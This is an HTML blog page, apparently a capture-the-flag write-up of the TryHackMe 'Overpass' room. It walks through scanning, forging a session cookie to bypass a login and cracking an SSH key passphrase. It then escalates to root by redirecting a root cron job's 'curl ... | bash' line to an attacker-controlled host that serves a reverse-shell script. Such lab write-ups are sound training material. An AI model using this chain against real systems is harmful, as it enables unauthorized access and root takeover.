@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC&#43;9C&#43;kkHPiled/u3cVUVHHe7NS68fdN1&#43;LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX&#43;GrLkXokkcBXlxj0NV&#43;r5t&#43;Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX&#43;Amn3 | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L&#43;O4GvqKqkwShe5DFEWeIMuzxjhE0AW&#43;LH4uJUVdoC0985Gy3z9zQU= | 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH&#43;1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR 80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass |_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf aboutus [Status: 301, Size: 0, Words: 1, Lines: 1] admin [Status: 301, Size: 42, Words: 3, Lines: 3] css [Status: 301, Size: 0, Words: 1, Lines: 1] downloads [Status: 301, Size: 0, Words: 1, Lines: 1] img [Status: 301, Size: 0, Words: 1, Lines: 1] index." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/overpass/overpass/" />
+
+
+    <title>
+        
+            Overpass :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Overpass">
+<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC&#43;9C&#43;kkHPiled/u3cVUVHHe7NS68fdN1&#43;LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX&#43;GrLkXokkcBXlxj0NV&#43;r5t&#43;Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX&#43;Amn3 | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L&#43;O4GvqKqkwShe5DFEWeIMuzxjhE0AW&#43;LH4uJUVdoC0985Gy3z9zQU= | 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH&#43;1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR 80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass |_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf aboutus [Status: 301, Size: 0, Words: 1, Lines: 1] admin [Status: 301, Size: 42, Words: 3, Lines: 3] css [Status: 301, Size: 0, Words: 1, Lines: 1] downloads [Status: 301, Size: 0, Words: 1, Lines: 1] img [Status: 301, Size: 0, Words: 1, Lines: 1] index."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="840"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Overpass"/>
+<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC&#43;9C&#43;kkHPiled/u3cVUVHHe7NS68fdN1&#43;LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX&#43;GrLkXokkcBXlxj0NV&#43;r5t&#43;Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX&#43;Amn3 | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L&#43;O4GvqKqkwShe5DFEWeIMuzxjhE0AW&#43;LH4uJUVdoC0985Gy3z9zQU= | 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH&#43;1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR 80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass |_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf aboutus [Status: 301, Size: 0, Words: 1, Lines: 1] admin [Status: 301, Size: 42, Words: 3, Lines: 3] css [Status: 301, Size: 0, Words: 1, Lines: 1] downloads [Status: 301, Size: 0, Words: 1, Lines: 1] img [Status: 301, Size: 0, Words: 1, Lines: 1] index."/>
+
+
+
+    <meta property="og:title" content="Overpass" />
+<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC&#43;9C&#43;kkHPiled/u3cVUVHHe7NS68fdN1&#43;LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX&#43;GrLkXokkcBXlxj0NV&#43;r5t&#43;Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX&#43;Amn3 | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L&#43;O4GvqKqkwShe5DFEWeIMuzxjhE0AW&#43;LH4uJUVdoC0985Gy3z9zQU= | 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH&#43;1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR 80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass |_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf aboutus [Status: 301, Size: 0, Words: 1, Lines: 1] admin [Status: 301, Size: 42, Words: 3, Lines: 3] css [Status: 301, Size: 0, Words: 1, Lines: 1] downloads [Status: 301, Size: 0, Words: 1, Lines: 1] img [Status: 301, Size: 0, Words: 1, Lines: 1] index." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/overpass/overpass/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/overpass/overpass/">Overpass</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
+|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
+|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
+80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Overpass
+|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1]
+admin                   [Status: 301, Size: 42, Words: 3, Lines: 3]
+css                     [Status: 301, Size: 0, Words: 1, Lines: 1]
+downloads               [Status: 301, Size: 0, Words: 1, Lines: 1]
+img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
+index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]
+</code></pre><p>well first enumeration got us the minimum</p>
+<p>Meaning we have to focus on the websie itself</p>
+<p>let&rsquo;s focus on their about us page first</p>
+<pre tabindex="0"><code>Ninja - Lead Developer
+
+Pars - Shibe Enthusiast and Emotional Support Animal Manager
+
+Szymex - Head Of Security
+
+Bee - Chief Drinking Water Coordinator
+
+MuirlandOracle - Cryptography Consultant
+</code></pre><p>potential usernames? not sure&hellip;</p>
+<p>Shall we bruteforce the admin page we found? is it anything in their source code?</p>
+<p>Lets focus on admin page then..it&rsquo;s an easy room it can&rsquo;t be something too complicated</p>
+<p>Oh the javascript login function</p>
+<pre tabindex="0"><code>async function login() {
+const usernameBox = document.querySelector(&#34;#username&#34;);
+const passwordBox = document.querySelector(&#34;#password&#34;);
+const loginStatus = document.querySelector(&#34;#loginStatus&#34;);
+loginStatus.textContent = &#34;&#34;
+const creds = { username: usernameBox.value, password: passwordBox.value }
+const response = await postData(&#34;/api/login&#34;, creds)
+const statusOrCookie = await response.text()
+if (statusOrCookie === &#34;Incorrect credentials&#34;) {
+loginStatus.textContent = &#34;Incorrect Credentials&#34;
+passwordBox.value=&#34;&#34;
+} else {
+Cookies.set(&#34;SessionToken&#34;,statusOrCookie)
+window.location = &#34;/admin&#34;
+}
+}
+</code></pre><p>On successful login a SessionToken cookie is created</p>
+<p>lets craft it ourselves..as long as the cookie is named SessionToken we pass</p>
+<pre tabindex="0"><code>Since you keep forgetting your password, James, I&#39;ve set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I&#39;m tired of fixing stuff for you.
+Also, we really need to talk about this &#34;Military Grade&#34; encryption. - Paradox
+</code></pre><p>haha poor james&hellip;ok lets crack his key with john and rockyou</p>
+<pre tabindex="0"><code>james13 (james_id_rsa)
+
+james:james13
+</code></pre><p>If james forgets that passphrase too he is a moron</p>
+<pre tabindex="0"><code>$chmod 600 james_id_rsa
+
+$ssh James@10.10.72.200 -i james_id_rsa
+Enter passphrase for key &#39;james_id_rsa&#39;:
+Connection closed by 10.10.72.200 port 22
+</code></pre><p>ugh&hellip;what is this again???? yeah it was serverfault error</p>
+<p>I just had to wait (or restart the macine) and now it works</p>
+<pre tabindex="0"><code>james@overpass-prod:~$ cat user.txt
+thm{james_got_a_new_job}
+</code></pre><p>got user FLAG</p>
+<p>another file there</p>
+<pre tabindex="0"><code>james@overpass-prod:~$ cat todo.txt
+To Do:
+
+&gt; Update Overpass&#39; Encryption, Muirland has been complaining that it&#39;s not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don&#39;t forget it.
+&gt; Wait, we make a password manager. Why don&#39;t I just use that?
+&gt; Test Overpass for macOS, it builds fine but I&#39;m not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+&gt; They&#39;re not updating on the website
+</code></pre><p>lets privEsc before we got problems again</p>
+<h2 id="prviledge-escalation">Prviledge Escalation</h2>
+<p><code>sudo -l</code> won&rsquo;t work this time beacause we dont have james sudo password</p>
+<p>He say he used overpass to store it</p>
+<p>it seems like we need to use the overpass build script</p>
+<p>I already downloaded it in soure files earlier</p>
+<pre tabindex="0"><code>james@overpass-prod:~$ find / -name &#39;overpass&#39; 2&gt; /dev/null
+/usr/bin/overpass
+</code></pre><p>ok they got overpass installed</p>
+<pre tabindex="0"><code>overpass
+Welcome to Overpass
+Options:
+1 Retrieve Password For Service
+2 Set or Update Password For Service
+3 Delete Password For Service
+4 Retrieve All Passwords
+5 Exit
+Choose an option: 4
+System saydrawnlyingpicture
+</code></pre><p>we retrieve system password</p>
+<pre tabindex="0"><code>sudo -l
+[sudo] password for james:
+Sorry, user james may not run sudo on overpass-prod.
+</code></pre><p>lmao that was a big waste of my time</p>
+<p>well lets uplaod linPEAS with a python server and get real informations</p>
+<pre tabindex="0"><code>╔══════════╣ Cron jobs
+...
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+- - - - - root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/etc/hosts
+/home/james
+/run/lock
+/run/screen
+/run/screen/S-james
+/run/user/1001
+/run/user/1001/gnupg
+/run/user/1001/systemd
+/tmp
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+#)You_can_write_even_more_files_inside_last_directory
+</code></pre><p>Basically a cron runs every 1 minutes as root and do a curl to <code>overpass.thm</code></p>
+<p>if its not in dns its a vhost and the <code>/etc/hosts</code> is writable</p>
+<p>Amazing&hellip;we use nano to point overpass.thm to our ip address</p>
+<pre tabindex="0"><code>cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+10.8.226.203 overpass.thm
+
+# The following lines are desirable for IPv6 capable hosts
+
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre><p>That means every 1 min the cron gonna run at /myserverfolder/downloads/src/buildscript.sh</p>
+<p>We just have to make that directory structure in a www folder and make MY buildscript.sh spawn a reverse shell</p>
+<p>we catch that connection in another netcat listenner</p>
+<p>1 minute after we are root</p>
+<pre tabindex="0"><code>root@overpass-prod:~# cat root.txt
+cat root.txt
+thm{control_over_the_host_server}
+</code></pre><p>For an easy room that privilege escalation was&hellip;tedious&hellip;but so great</p>
+<p>It was so cool making the run from or own server</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
